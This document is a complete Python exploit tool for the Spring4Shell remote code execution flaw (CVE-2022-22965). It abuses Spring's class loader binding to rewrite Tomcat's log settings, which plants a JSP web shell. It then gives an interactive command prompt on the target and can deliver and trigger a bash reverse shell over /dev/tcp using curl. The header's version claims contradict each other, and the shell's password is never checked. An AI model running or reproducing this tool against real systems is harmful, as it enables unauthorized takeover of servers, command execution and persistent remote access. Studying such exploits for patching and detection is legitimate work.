#!/usr/bin/env python3
# exploit title: spring4shell
# author: mike pickard
#         github: https://github.com/0zvxr
#         htb: 0zvxr
# vendor home: https://spring.io/
# vulnerable software and version: before 4.8.28 and 5.x before 5.6.3.
# tested on: Ubuntu Linux 20.04.
# cve: CVE-2022-22965
#
# description:
# simple script that exploits a remote code execution vulnerability found in
# the java spring framework before version 5.2, as well as in versions
# 5.3.0-17 and 5.2.0-19 and running on a version of the Java Development Kit
# greater than or equal to 9.

import argparse
import errno
import os
import re
import requests
import secrets
import shutil
import sys
import threading
import time
from bs4 import BeautifulSoup
from cmd import Cmd
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse


def arguments():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f"{sys.argv[0]} exploits an RCE vulnerability in"
        "\napplications running spring core java framework.",
        epilog=f"example:"
        f"\n\t{sys.argv[0]} http://10.10.10.10/"
    )
    parser.add_argument("address", help="ip/hostname, port, sub-directories"
                        " to the vulnerable spring core framework on tomcat")
    parser.add_argument("-f", "--filename", help="name of the file to create"
                        " and upload", default=filename())
    parser.add_argument("-p", "--password", help="password to protect the "
                        "uploaded shell", default=password())
    parser.add_argument("-d", "--directory", help="The upload path for the "
                        "file", default="webapps/ROOT")
    parser.add_argument("-a", "--accessible", help="turns off features"
                        " which may negatively affect screen readers",
                        action="store_true", default=False)
    parser.add_argument("-n", "--no-colour", help="removes colour output",
                        action="store_true", default=False)
    arguments.option = parser.parse_args()


# settings for terminal output defined by user in term_settings().
class settings():
    # colours.
    c0 = ""
    c1 = ""
    c2 = ""
    c3 = ""
    c4 = ""
    c5 = ""
    c6 = ""
    c7 = ""

    # information boxes.
    i1 = ""
    i2 = ""
    i3 = ""
    i4 = ""


# checks for terminal setting flags supplied by arguments().
def term_settings():
    if arguments.option.accessible:
        small_banner()
    elif arguments.option.no_colour:
        settings.i1 = "[+] "
        settings.i2 = "[!] "
        settings.i3 = "[i] "
        settings.i4 = "$ "
        banner()
    elif not arguments.option.accessible or arguments.option.no_colour:
        settings.c0 = "\u001b[0m"  # reset.
        settings.c1 = "\u001b[38;5;111m"  # marine blue.
        settings.c2 = "\u001b[38;5;1m"   # red.
        settings.c3 = "\u001b[38;5;2m"   # green.
        settings.i1 = "[+] "
        settings.i2 = "[!] "
        settings.i3 = "[i] "
        settings.i4 = "$ "
        banner()
    else:
        print("something went horribly wrong!")
        sys.exit()


# default terminal banner.
def banner():
    print(f"{settings.c3}"
        "\n                /           /  |      /         / /"
        "\n ___  ___  ___    ___  ___ (___| ___ (___  ___ ( ( "
        "\n|___ |   )|   )| |   )|   )    )|___ |   )|___)| | "
        "\n __/ |__/ |    | |  / |__/    /  __/ |  / |__  | | "
        f"\n     |                __/{settings.c0}"
        "\nCVE-2022-22965."
    )


def small_banner():
    print(
        f"{sys.argv[0]}"
        "\nCVE-2022-22965."
    )


# appends a '/' if not supplied at the end of the address.
def arg_check(address):
    check = re.search('/$', address)
    if check is not None:
        print('')
    else:
        arguments.option.address += "/"

# randomly generated if left at default.
def filename():
    filename = secrets.token_hex(8)
    return filename


# randomly generated if left at default.
def password():
    password = secrets.token_hex(4)
    return password


def get_host(address, with_scheme=False):
    uri = urlparse(address)
    return f"{uri.scheme}://{uri.netloc}" if with_scheme else uri.netloc


def http_start(http_server):
    http_server.serve_forever()


def http_stop(http_server):
    http_server.shutdown()


class terminal(Cmd):
    def __init__(self, shell, *command, **kwcommand):
        super().__init__(*command, **kwcommand)
        self.prompt = f"{exploit.user}@{get_host(shell)} {settings.i4}"
        self.shell = shell

    def default(self, command):
        command = command.strip()
        if command == "exit":
            exit()
        elif command.startswith("rsh"):
            try:
                _, ip, port = command.split(" ")
                self.bash_reverse_shell(ip, port)
            except ValueError:
                print(f"{settings.i3}syntax: rsh [ip] [port]")
            return
        elif not command:
            return
        spring_shell = requests.get(f"{self.shell}?cmd={command}", verify=False)
        if spring_shell.status_code == 404:
            print(f"{settings.c2}{settings.i2}error while attempting to send command.{settings.c0}")
        else:
            res = filter(None, spring_shell.text.split("\n"))
            print("\n".join(list(res)[:-1]))

    #def do_quit(self, command):
    #    return 0

    def bash_reverse_shell(self, ip, port):
        reverse_shell = "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        shell_name = f"/tmp/{secrets.token_hex(8)}.sh"
        instructions = reverse_shell.format(ip=ip, port=port)
        shell_directory = secrets.token_hex(8)
        if not os.path.isdir(shell_directory):
            os.mkdir(shell_directory)
        else:
            pass
        print(f"{settings.i3}creating bash reverse shell.")
        os.chdir(shell_directory)
        shell_filename = secrets.token_hex(8)
        with open(shell_filename, "w") as file_contents:
            file_contents.write(instructions)

        server_port = int(port) - 1
        print(f"{settings.i3}starting http server.")
        http_server = HTTPServer(("0.0.0.0", server_port), SimpleHTTPRequestHandler)
        server = threading.Thread(name='python http server', target=http_start, args=(http_server,))
        server.start()
        time.sleep(2)
        print(f"{settings.i3}getting the reverse shell with a curl request.")
        curl_command = f"curl -o {shell_name} http://{ip}:{server_port}/{shell_filename}"
        spring_shell = requests.get(f"{self.shell}?cmd={curl_command}", verify=False)
        time.sleep(2)
        print(f"{settings.i3}stopping http server and clearing temporary directory.")
        http_stop(http_server)
        os.chdir("..")
        shutil.rmtree(shell_directory, ignore_errors=False)
        if spring_shell.status_code != 200:
            print(f"{settings.i3}bash reverse shell could not be uploaded.")
            return
        else:
            print(f"{settings.i3}loading the reverse shell.")
            requests.get(f"{self.shell}?cmd=chmod +x {shell_name}", verify=False)
            print(f"{settings.i3}attempting to trigger the reverse shell.")
            input(f"{settings.i3}start the listener at {port} and press enter.")
            print(f"{settings.i3}executing the reverse shell")
            print(f"{settings.i3}check your listener.")
            requests.get(f"{self.shell}?cmd=bash {shell_name}", verify=False)


def exploit(address, filename, password, directory):
    #directory = "webapps/ROOT"
    #filename = secrets.token_hex(16)
    post_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    get_headers = {"prefix": "<%", "suffix": "%>//", "c": "Runtime"}

    log_pattern = (
        "class.module.classLoader.resources.context.parent."
        "pipeline.first.pattern=%25%7Bprefix%7Di%20"
        "java.io.InputStream%20in%20%3D%20%25%7Bc%7Di."
        "getRuntime().exec(request.getParameter(%22cmd%22))."
        "getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%"
        "5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B"
        "%20while((a%3Din.read(b))!%3D-1)%7B%20out."
        "println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
    )
    log_file_suffix = (
        "class.module.classLoader.resources."
        "context.parent.pipeline.first.suffix=.jsp"
    )
    log_file_dir = (
        "class.module.classLoader.resources.context."
        f"parent.pipeline.first.directory={directory}"
    )
    log_file_prefix = (
        "class.module.classLoader.resources.context."
        f"parent.pipeline.first.prefix={filename}"
    )
    log_file_date_format = (
        "class.module.classLoader.resources.context."
        "parent.pipeline.first.fileDateFormat="
    )
    file_date_data = (
        "class.module.classLoader.resources.context."
        "parent.pipeline.first.fileDateFormat=_"
    )
    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="

    exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
    

    print(f"{settings.i3}attempting to change tomcat log variables.")
    reset = requests.post(address, headers=post_headers, data=file_date_data, verify=False)
    if reset.status_code != 200:
        print(f"{settings.c2}{settings.i2}cannot set log variables.{settings.c0}")
    else:
        print(f"{settings.c3}{settings.i1}log variables set successfully.{settings.c0}")

    # Change the tomcat log location variables
    print(f"{settings.c3}{settings.i1}attempting to change tomcat log location variables.{settings.c0}")
    reset = requests.post(address, headers=post_headers, data=exp_data, verify=False)
    if reset.status_code != 200:
        print(f"{settings.c2}{settings.i2}the log configuration could not be modified.{settings.c0}")
        sys.exit(1)
    else:
        print(f"{settings.c3}{settings.i1}log successfully modified.{settings.c0}")
    time.sleep(2)
    print(f"{settings.i3}waiting for tomcat changes.")
    time.sleep(2)
    print(f"{settings.i3}sending the webshell.")
    requests.get(address, headers=get_headers, verify=False)
    time.sleep(2)
   
    # prevents future writes to the file.
    print(f"{settings.i3}resetting the log variables.")
    requests.post(address, headers=post_headers, data=pattern_data, verify=False)
    time.sleep(5)
    print(
        f"{settings.i3}shell location:"
        f"\n{settings.i3}{address}{filename}.jsp?pwd={password}&cmd=whoami"
    )
    get_user = requests.get(f"{address}{filename}.jsp?pwd={password}&cmd=whoami")
    parse_user = str(BeautifulSoup(get_user.content, "html.parser"))
    #print("\n".join(list(user)[:-1]))
    #print (parse_user)
    exploit.user = str(parse_user.split('\n')[0])
    #print (f"new> {exploit.user}")
    return f"{get_host(address, with_scheme=True)}/{filename}.jsp"


def main():
    try:
        arguments()
        term_settings()
        arg_check(arguments.option.address)
        shell = exploit(
            arguments.option.address,
            arguments.option.filename,
            arguments.option.password,
            arguments.option.directory
        )
        term = terminal(shell)
        term.cmdloop()
    except KeyboardInterrupt:
        print(f"\n{settings.i3}quitting.")
        sys.exit()
    except requests.exceptions.Timeout:
        print(
            f"{settings.c2}{settings.i2}the request timed out "
            f"while attempting to connect.{settings.c0}"
        )
        sys.exit()
    except requests.ConnectionError:
        print(
            f"{settings.c2}{settings.i2}could not connect "
            f"to {arguments.option.address}{settings.c0}"
        )


if __name__ == "__main__":
    main()
